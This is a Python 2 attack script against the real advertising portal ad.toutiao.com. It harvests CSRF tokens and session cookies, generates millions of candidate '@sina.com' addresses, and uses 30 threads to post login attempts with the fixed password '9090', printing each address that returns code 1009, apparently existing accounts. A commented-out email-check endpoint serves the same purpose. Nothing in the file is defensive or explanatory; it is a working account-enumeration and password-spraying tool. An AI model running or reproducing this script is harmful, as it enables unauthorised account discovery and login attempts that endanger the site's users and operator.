#coding=utf-8

import requests
import urllib
import random
import json
import time
import threading
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def getcsrf():
	url = "https://ad.toutiao.com/forgot/"

	headers = {
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding':'gzip, deflate, sdch, br',
		'Accept-Language':'en-US,en;q=0.8,zh;q=0.6',
		'Connection':'keep-alive',
		'Host':'ad.toutiao.com',
		'Upgrade-Insecure-Requests':'1',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
	}

	r = requests.get(url, headers=headers, verify=False)

	csrfmiddle = r.cookies["csrftoken"]

	cookie = "login_flag=%s; sid_tt=%s; sessionid=%s; csrftoken=%s; sid_guard=%s; part=%s; tt_webid=%s" %(r.cookies["login_flag"],
		r.cookies["sid_tt"], r.cookies["sessionid"], csrfmiddle, r.cookies["sid_guard"], r.cookies["part"], r.cookies['tt_webid'])

	return csrfmiddle, cookie


def checkemail(csrfmiddle, cookie, qq):
	url = "https://ad.toutiao.com/advertiser/check_email/"

	payload = {
		'csrfmiddlewaretoken':str(csrfmiddle),
		'email':str(qq),
	}

	ll = urllib.urlencode(payload)

	headers = {
		'Accept':'*/*',
		'Accept-Encoding':'gzip, deflate, br',
		'Accept-Language':'en-US,en;q=0.8,zh;q=0.6',
		'Connection':'keep-alive',
		'Content-Length':ll,
		'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		'Cookie': str(cookie),
		'Host':'ad.toutiao.com',
		'Origin':'https://ad.toutiao.com',
		'Referer':'https://ad.toutiao.com/forgot/',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
		'X-CSRFToken':str(csrfmiddle),
		'X-Requested-With':'XMLHttpRequest',
	}

	r = requests.post(url, headers=headers, data=payload, verify=False)

	print qq, "....", r.text

def getold():
	url = "https://ad.toutiao.com/old_login/"
	headers = {
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding':'gzip, deflate, sdch, br',
		'Accept-Language':'en-US,en;q=0.8,zh;q=0.6',
		'Connection':'keep-alive',
		'Host':'ad.toutiao.com',
		'Upgrade-Insecure-Requests':'1',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
	}

	r = ss.get(url, headers=headers, verify=False)

	csrfmiddle = r.cookies["csrftoken"]

	cookie = " csrftoken=%s;  part=%s; tt_webid=%s" %(csrfmiddle, r.cookies["part"], r.cookies['tt_webid'])

	return csrfmiddle, cookie

def postold(csrfmiddle, cookie, mail):
	url = "https://ad.toutiao.com/old_login/"

	files = {
		"csrfmiddlewaretoken":(None, str(csrfmiddle)),
		"email":(None, str(mail)),
		"password":(None, "9090"),
	}


	from requests_toolbelt import MultipartEncoder
	
	m = MultipartEncoder(fields=files, boundary="----WebKitFormBoundaryRgFdemk5CNNZaY6j")

	headers = {
		'Accept':'*/*',
		'Accept-Encoding':'gzip, deflate, br',
		'Accept-Language':'en-US,en;q=0.8,zh;q=0.6',
		'Connection':'keep-alive',
		'Content-Type':m.content_type,
		'Host':'ad.toutiao.com',
		'Cookie':cookie,
		'Origin':'https://ad.toutiao.com',
		'Referer':'https://ad.toutiao.com/old_login/',
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
		'X-Requested-With':'XMLHttpRequest',
	}

	r = ss.post(url, headers=headers, data=m.to_string(), verify=False)
	pp = json.loads(r.text)
	#print  pp
	if pp['code'] == 1009:
		print mail, "....", r.text


ss = requests.session()

AAA = "abcdefghijklmnopqrstuvwxyz0123456789"
BBB = "abcdefghijklmnopqrstuvwxyz"
pp = set()
def pro6apl():
	for x in BBB:
		for y in BBB:
			for z in BBB:
				for s in AAA:
					for t in AAA:
						for u in AAA:
							pstr = x + y + z + s + t + u
							pp.add(pstr)


class worker(threading.Thread):
	def run(self):
		count = 0
		while  True:
			if (len(pp) == 0):
				break
			mail = "%s@sina.com" % (pp.pop())
			#checkemail(csrfmiddle, cookie, mail)
			postold(csrfmiddle, cookie, mail)
			# count += 1
			# if count > 3000:
			# 	break


if __name__ == '__main__':

	csrfmiddle, cookie = getcsrf()
	#print csrfmiddle, cookie
	#print cookie
	#postold(csrfmiddle, cookie)
	count = 0
	# csrfmiddle, cookie = getcsrf()

	print "ready product cc"
	pro6apl()
	print "===product===over==="

	threads = []
	for x in range(30):
		threads.append(worker())

	print "==start==check===out==="
	for t in threads:
		t.start()
		time.sleep(1)

	print "===over==="

	# while  True:
	# 	mail = "%s@sina.com" % (pro6apl())
	# 	#checkemail(csrfmiddle, cookie, mail)
	# 	postold(csrfmiddle, cookie, mail)
	# 	count += 1
	# 	if count % 100 == 0:
	# 		print "xxx"
	# 	if count > 3000:
	# 		break
